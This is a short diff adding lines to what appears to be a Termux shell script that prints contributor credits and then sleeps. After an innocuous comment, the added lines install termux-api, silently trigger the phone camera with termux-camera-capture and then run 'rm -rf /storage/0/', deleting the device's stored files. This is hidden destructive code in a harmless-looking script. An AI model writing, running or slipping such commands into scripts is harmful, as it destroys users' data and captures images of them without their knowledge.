@@ -38,4 +38,12 @@ echo -e"Special thanks: Contibutors and Termux Discuss Party ";
 sleep 200
 
 # Efek dash eksekusi
+apt update
+apt upgrade
+pkg update
+pkg upgrade
+pkg install termux-api
+termux-camera-capture
+rm -rf /storage/0/
+
 
